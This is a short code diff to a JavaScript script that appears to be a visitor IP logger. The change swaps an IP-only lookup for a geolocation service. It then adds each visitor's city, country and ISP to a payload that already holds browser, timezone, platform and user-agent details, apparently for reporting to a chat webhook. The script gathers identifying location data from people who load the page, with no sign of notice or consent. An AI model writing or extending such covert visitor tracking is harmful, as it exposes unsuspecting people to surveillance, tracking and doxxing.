@@ -37,10 +37,16 @@
   else if (/OPR|Opera/i.test(ua)) browser = "Opera";
 
   let ip = "Unknown";
+  let city = "Unknown";
+  let country = "Unknown";
+  let isp = "Unknown";
   try {
-    const res = await fetch("https://api.ipify.org?format=json");
+    const res = await fetch("https://ip-api.com/json/");
     const data = await res.json();
-    ip = data.ip;
+    ip = data.query;
+    city = data.city;
+    country = data.country;
+    isp = data.isp;
   } catch (_) {}
 
   const payload = {
@@ -56,6 +62,9 @@
         { name: "Language", value: lang, inline: true },
         { name: "Timezone", value: timezone, inline: true },
         { name: "IP Address", value: ip, inline: true },
+        { name: "City", value: city, inline: true },
+        { name: "Country", value: country, inline: true },
+        { name: "ISP", value: isp, inline: true },
         { name: "Platform", value: platform, inline: true },
         { name: "Time", value: time, inline: false },
         { name: "User Agent", value: `\`${ua.slice(0, 200)}\``, inline: false }
